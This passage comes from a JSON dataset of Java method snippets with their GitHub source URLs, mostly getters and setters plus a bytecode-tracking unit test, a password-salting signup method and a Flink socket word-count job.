"TestInstructionTracking", "params": [], "throws": ["AnalyzerException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testConcatStrings_SwapOrder() throws AnalyzerException {\n\t\tClassNode node = getFromName(\"bin/custom/misc/HelloWorldSwapOrdering.class\");\n\t\tMethodNode method = getMethod(node, \"helloVariables\");\n\t\tFrame<AbstractValue>[] frames = TestUtils.getFrames(node.name, method);\n\t\tint index = getMethodCallIndex(method.instructions, \"println\");\n\t\t// The following is the disassembly of the method \"helloVariables\"\n\t\t//\n\t\t// Lines prefixed with \">>>>>>>>>>>>>\" indicate they are contributing instructions\n\t\t// to the value \"Hello World\" at the given frame index.\n\t\t//\n\t\t// GOTO C\n\t\t// A:\n\t\t// >>>>>>>>>>>>> SWAP\n\t\t// >>>>>>>>>>>>> NEW java/lang/StringBuilder\n\t\t// DUP\n\t\t// INVOKESPECIAL java/lang/StringBuilder.<init>()V\n\t\t// >>>>>>>>>>>>> SWAP\n\t\t// >>>>>>>>>>>>> INVOKEVIRTUAL java/lang/StringBuilder.append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\t\t// >>>>>>>>>>>>> LDC \" \"\n\t\t// >>>>>>>>>>>>> INVOKEVIRTUAL java/lang/StringBuilder.append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\t\t// >>>>>>>>>>>>> SWAP\n\t\t// >>>>>>>>>>>>> INVOKEVIRTUAL java/lang/StringBuilder.append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\t\t// >>>>>>>>>>>>> INVOKEVIRTUAL java/lang/StringBuilder.toString()Ljava/lang/String;\n\t\t// GETSTATIC java/lang/System.out Ljava/io/PrintStream;\n\t\t// >>>>>>>>>>>>> SWAP\n\t\t// INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V\n\t\t// GOTO D\n\t\t// B:\n\t\t// >>>>>>>>>>>>> LDC \"World\"\n\t\t// GOTO A\n\t\t// ATHROW\n\t\t// C:\n\t\t// >>>>>>>>>>>>> LDC \"Hello\"\n\t\t// GOTO B\n\t\t// D:\n\t\t// RETURN\n\t\tList<AbstractInsnNode> insns = FrameUtil.getTopStack(frames[index]).getInsns();\n\t\tassertEquals(12, insns.size());\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/java/me/coley/analysis/instruction/TestInstructionTracking.java", "stars": "12", "class_props": {"extends": "TestUtils", "implements": null, "modifiers": ["public"]}}, {"id": 59844, "method_name": "getId", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59845, "method_name": "setId", "class_name": "CardPacket", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(int id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59846, "method_name": "getCard", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCard() {\n        return card;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59847, "method_name": "setCard", "class_name": "CardPacket", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCard(int card) {\n        this.card = card;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59848, "method_name": "getChangeDate", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getChangeDate() {\n        return changeDate;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59849, "method_name": "setChangeDate", "class_name": "CardPacket", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setChangeDate(String changeDate) {\n        this.changeDate = changeDate;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59850, "method_name": "getComment", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getComment() {\n        return comment;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59851, "method_name": "setComment", "class_name": "CardPacket", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setComment(String comment) {\n        this.comment = comment;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59852, "method_name": "getDateFrom", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getDateFrom() {\n        return dateFrom;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59853, "method_name": "setDateFrom", "class_name": "CardPacket", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDateFrom(Date dateFrom) {\n        this.dateFrom = dateFrom;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59854, "method_name": "getDateTo", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getDateTo() {\n        return dateTo;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59855, "method_name": "setDateTo", "class_name": "CardPacket", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDateTo(Date dateTo) {\n        this.dateTo = dateTo;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59856, "method_name": "getPacket", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPacket() {\n        return packet;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59857, "method_name": "setPacket", "class_name": "CardPacket", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPacket(String packet) {\n        this.packet = packet;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59858, "method_name": "getPeriod", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPeriod() {\n        return period;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59859, "method_name": "setPeriod", "class_name": "CardPacket", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPeriod(String period) {\n        this.period = period;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59860, "method_name": "getStatus", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getStatus() {\n        return status;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59861, "method_name": "setStatus", "class_name": "CardPacket", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatus(String status) {\n        this.status = status;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59862, "method_name": "getPacketId", "class_name": "CardPacket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPacketId() {\n        return packetId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59863, "method_name": "setPacketId", "class_name": "CardPacket", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPacketId(int packetId) {\n        this.packetId = packetId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/cerbercrypt/CardPacket.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59864, "method_name": "signup", "class_name": "SignupBusinessServiceImpl", "params": ["UserEntity"], "throws": ["SignUpRestrictedException"], "modifiers": ["public"], "return_type": "UserEntity", "snippet": "\tpublic UserEntity signup(UserEntity userEntity) throws SignUpRestrictedException{\n\t\tString[] encryptedText = passwordCryptographyProvider.encrypt(userEntity.getPassword());\n\t\tuserEntity.setSalt(encryptedText[0]);\n\t\tuserEntity.setPassword(encryptedText[1]);\n\n\t\treturn userDao.createUser(userEntity);\n\n\t}", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-service/src/main/java/com/upgrad/musichoster/service/business/SignupBusinessServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["SignupBusinessService"], "modifiers": ["public"]}}, {"id": 59865, "method_name": "onCreate", "class_name": "SarrafiApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void onCreate() {\n    super.onCreate();\n    DatabaseManager.getInstance().init(getApplicationContext());\n  }", "url": "https://raw.githubusercontent.com/Rminsh/Sarrafi/master/app/src/main/java/com/shalchian/sarrafi/SarrafiApplication.java", "stars": "22", "class_props": {"extends": "Application", "implements": null, "modifiers": ["public"]}}, {"id": 59866, "method_name": "maskInform", "class_name": "ExtInformController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Response<String>", "snippet": "    public Response<String> maskInform(){\n        return null;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/external/ExtInformController.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59867, "method_name": "getLine", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getLine() {\n\t\treturn this.line;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59868, "method_name": "getColumn", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getColumn() {\n\t\treturn this.column;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59869, "method_name": "getIndent", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getIndent() {\n\t\treturn indent;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59870, "method_name": "setIndent", "class_name": "Code", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setIndent(int indent) {\n\t\tthis.indent = indent;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59871, "method_name": "generateCode", "class_name": "Code", "params": [], "throws": ["CodeException"], "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "\tpublic abstract String generateCode() throws CodeException;\n\n\tpublic String tab() {\n\t\tString result = \"\";\n\t\tfor (int i=1 ; i <= indent*3 ; ++i)\n\t\t\tresult += \" \";\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59872, "method_name": "tab", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String tab() {\n\t\tString result = \"\";\n\t\tfor (int i=1 ; i <= indent*3 ; ++i)\n\t\t\tresult += \" \";\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59873, "method_name": "incIndent", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void incIndent() {\n\t\t++indent;\n\t\tindent();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59874, "method_name": "decIndent", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void decIndent() {\n\t\t--indent;\n\t\tindent();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59875, "method_name": "getId", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getId() {\n\t\treturn id;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59876, "method_name": "indent", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "\tpublic abstract void indent();\n\n}\n\n", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 59877, "method_name": "main", "class_name": "staticStudy", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args){\n        Person perA = new Person(\"\u5f20\u4e09\",10);\n        Person perB = new Person(\"\u674e\u56db\",10);\n        Person perC = new Person(\"\u738b\u4e94\",10);\n        Person perD = new Person();\n//        Person.country = \"\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\";\n//        System.out.println(perA.getInfo());\n//        System.out.println(perB.getInfo());\n//        System.out.println(perC.getInfo());\n\n//        Person.setCountry(\"\u7f8e\u56fd\");\n        System.out.println(Person.getCount());    //static\u5c5e\u6027\u53ef\u4ee5\u5728\u4e0d\u5b9e\u4f8b\u5316\u5c31\u4f7f\u7528\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaStudy/staticStudy.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59878, "method_name": "getCount", "class_name": "Person", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int getCount() {   // \u58f0\u660e\u9759\u6001\u65b9\u6cd5\n        return count;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaStudy/staticStudy.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59879, "method_name": "getInfo", "class_name": "Person", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public  String getInfo(){\n        return \"\u59d3\u540d:\"+ this.name + \"\u5e74\u9f84:\"+this.age + \"\u56fd\u5bb6:\" + this.country;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaStudy/staticStudy.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59880, "method_name": "setCountry", "class_name": "Person", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setCountry(String c){\n        country=c;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaStudy/staticStudy.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59881, "method_name": "videoUpdate", "class_name": "VideoController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JsonData", "snippet": "    public JsonData videoUpdate(){\n        return JsonData.buildSuccess();\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/controller/VideoController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59882, "method_name": "main", "class_name": "FaceRecognitionApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        SpringApplication.run(FaceRecognitionApplication.class, args);\n    }", "url": "https://raw.githubusercontent.com/ck003/face_recognition/master/src/main/java/me/kyriechen/face_recognition/FaceRecognitionApplication.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59883, "method_name": "getReturn", "class_name": "TariffOptionGetResponse", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TariffOption", "snippet": "    public TariffOption getReturn() {\n        return _return;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/tariff/option/TariffOptionGetResponse.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59884, "method_name": "setReturn", "class_name": "TariffOptionGetResponse", "params": ["TariffOption"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReturn(TariffOption value) {\n        this._return = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/tariff/option/TariffOptionGetResponse.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59885, "method_name": "getId", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59886, "method_name": "setId", "class_name": "Setting", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59887, "method_name": "getSiteName", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSiteName() {\n        return siteName;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59888, "method_name": "setSiteName", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSiteName(String siteName) {\n        this.siteName = siteName;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59889, "method_name": "getSiteDonation", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSiteDonation() {\n        return siteDonation;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59890, "method_name": "setSiteDonation", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSiteDonation(String siteDonation) {\n        this.siteDonation = siteDonation;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59891, "method_name": "getSiteMusic", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSiteMusic() {\n        return siteMusic;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59892, "method_name": "setSiteMusic", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSiteMusic(String siteMusic) {\n        this.siteMusic = siteMusic;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59893, "method_name": "getSiteLinks", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSiteLinks() {\n        return siteLinks;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59894, "method_name": "setSiteLinks", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSiteLinks(String siteLinks) {\n        this.siteLinks = siteLinks;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59895, "method_name": "getAbout", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAbout() {\n        return about;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59896, "method_name": "setAbout", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAbout(String about) {\n        this.about = about;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59897, "method_name": "getAboutMd", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAboutMd() {\n        return aboutMd;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59898, "method_name": "setAboutMd", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAboutMd(String aboutMd) {\n        this.aboutMd = aboutMd;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59899, "method_name": "index", "class_name": "HomeController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String index() {\n        System.out.println(\"swagger-ui.html\");\n        return \"redirect:swagger-ui.html\";\n    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/io/swagger/configuration/HomeController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59900, "method_name": "getTimeZone", "class_name": "TimeIssController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getTimeZone(){\n        lat = issData.getLat();\n        lon = issData.getLon();\n        String url = \"https://api.ipgeolocation.io/timezone?apiKey=\"+ apikeyipgeolocation + \"&lat=\"+lat+\"&long=\" + lon;\n        RestTemplate restTemplate = new RestTemplate();\n        HttpEntity httpEntityTimeISS = new HttpEntity(timeISS);\n        ResponseEntity<TimeISS> exchange = restTemplate.exchange(url, HttpMethod.GET, httpEntityTimeISS, TimeISS.class);\n        this.timeISS = exchange.getBody();\n        issData.setLocalTimeISS(LocalTime.parse(timeISS.getTime24(), DateTimeFormatter.ofPattern(\"HH:mm:ss\")));\n    }", "url": "https://raw.githubusercontent.com/wojciechgalach/PositionInternationalSpaceStation/master/src/main/java/pl/com/nur/internationalspacestation/internationalspacestation/controller/TimeIssController.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59901, "method_name": "main", "class_name": "StreamingJob", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws Exception {\n\n        // get the execution environment\n        final StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();\n\n        // get input data by connecting to the socket\n        DataStream<String> text = env.socketTextStream(\"127.0.0.1\", 9000, \"\\n\");\n\n        // parse the data, group it, window it, and aggregate the counts\n        DataStream<WordWithCount> windowCounts = text\n                .flatMap(new FlatMapFunction<String, WordWithCount>() {\n                    @Override\n                    public void flatMap(String value, Collector<WordWithCount> out) {\n                        for (String word : value.split(\"\\\\s\")) {\n                            out.collect(new WordWithCount(word, 1L));\n                        }\n                    }\n                })\n                .keyBy(\"word\")\n                .timeWindow(Time.seconds(5), Time.seconds(1))\n                .reduce(new ReduceFunction<WordWithCount>() {\n                    @Override\n                    public WordWithCount reduce(WordWithCount a, WordWithCount b) {\n                        return new WordWithCount(a.word, a.count + b.count);\n                    }\n                });\n\n        // print the results with a single thread, rather than in parallel\n        windowCounts.print().setParallelism(1);\n\n        env.execute(\"Socket Window WordCount\");\n    }", "url": "https://raw.githubusercontent.com/wangzhiwubigdata/quickstart/master/src/main/java/org/myorg/quickstart/StreamingJob.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59902, "method_name": "toString", "class_name": "WordWithCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String toString() {\n            return word + \" : \" + count;\n        }", "url": "https://raw.githubusercontent.com/wangzhiwubigdata/quickstart/master/src/main/java/org/myorg/quickstart/StreamingJob.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 59903, "method_name": "onCreate", "class_name": "UsersList", "params": ["Bundle"], "throws": null, 